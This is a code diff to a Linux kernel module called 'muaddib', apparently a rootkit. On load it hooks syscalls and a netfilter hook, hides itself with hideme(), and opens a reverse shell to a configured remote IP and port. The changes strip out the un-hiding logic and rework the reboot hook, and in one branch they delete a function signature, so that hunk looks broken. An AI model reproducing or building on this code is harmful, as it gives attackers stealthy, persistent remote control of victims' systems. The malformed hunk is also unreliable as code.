@@ -37,17 +37,15 @@ static int __init muaddib_init(void){
 	int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err){ return err; }
-	reg_nf_hook();
+	err = reg_nf_hook();
+	if(err){return err; }
 	hideme(); //hide on load
-	hidden = 1;
 	start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     return 0;
 }
 
 static void __exit muaddib_cleanup(void){
     /* Unhook and restore the syscall and print to the kernel buffer */
-	showme();
-	hidden = 0;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unreg_nf_hook();
 	#if DEBUGMSG == 1
@@ -60,13 +58,14 @@ static void __exit muaddib_cleanup(void){
 static asmlinkage long (*og_reboot)(const struct pt_regs *);
 
 asmlinkage int muaddib_reboot(const struct pt_regs *regs){
-    muaddib_cleanup();
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	unreg_nf_hook();
     return og_reboot(regs);
 }
 #else
 static asmlinkage long (*og_reboot) (int magic, int magic2, int cmd, void *arg);
-asmlinkage int muaddib_reboot(int magic, int magic2, int cmd, void *arg){
-	muaddib_cleanup();
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	unreg_nf_hook();
 	og_reboot(magic, magic2, cmd, arg);
 }
 #endif
